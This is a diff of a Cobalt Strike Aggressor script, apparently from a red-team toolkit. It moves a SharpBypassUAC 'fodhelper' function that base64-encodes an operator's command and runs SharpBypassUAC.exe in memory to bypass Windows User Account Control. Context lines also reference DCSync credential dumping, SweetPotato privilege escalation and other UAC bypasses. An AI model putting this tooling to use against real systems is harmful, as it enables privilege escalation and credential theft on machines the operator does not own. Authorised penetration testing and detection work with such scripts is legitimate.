@@ -178,17 +178,6 @@ item "Run Watson to find missing patches  - T1082"{
 		}
 	}
 
-#################################################
-
-#   SharpBypassUAC
-
-#################################################
-item "fodhelper"{
-            local('$bid');
-                foreach $bid ($1){
-                    uacfodhelper($bid);
-                }
-            }	
 	    
 #################################################
 
@@ -282,20 +271,6 @@ item "DiskCleanup bypass"{
 
 
 } #End of UAC Bypass Menu
-
-
-#################################################
-
-#   UAC Bypass Functions
-
-#################################################
-
-
-
-
-#Please Add UAC Bypass Functions - https://github.com/FatRodzianko/SharpBypassUAC
-
-
 
 
 
@@ -502,18 +477,7 @@ sub mass-dcsync {
 
 }
 
-#################################################
 
-#   SharpBypassUAC
-
-#################################################
-
-sub uacfodhelper{ 
-prompt_text("Enter A Command:", "", lambda({ 
-$b64 = base64_encode("$1")
-}))
-bexecute_assembly($1, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
-}
 
 #################################################
 
@@ -550,4 +514,28 @@ bexecute_assembly($1, script_resource('/exe/SharpUp.exe'));
 sub sweetpotato{
 bexecute_assembly($1, script_resource('/exe/SweetPotato.exe'));
 }
+
+#################################################
+
+#   UAC Bypass Functions
+
+#################################################
+
+#################################################
+
+#   SharpBypassUAC
+
+#################################################
+
+sub fodhelper_bypass{ 
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($1, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
+}
+
+#Please Add UAC Bypass Functions - https://github.com/FatRodzianko/SharpBypassUAC
+
+
+
 
